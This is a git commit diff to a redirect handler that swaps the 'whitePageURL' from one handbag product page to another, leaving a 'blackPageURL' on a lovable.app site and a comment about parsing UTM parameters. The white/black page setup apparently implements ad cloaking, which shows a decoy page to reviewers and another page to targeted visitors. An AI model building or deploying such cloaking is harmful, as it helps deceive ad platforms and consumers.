d0a31fe3f790f2953f99624eba2440c229a457b5
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-11-13 06:00:20 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.bethanylinz.com/products/paradise-large-tote-bag";
+    const whitePageURL = "https://harryaustinbags.com/collections/all/products/milano-shoulder-bag-black";
     const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
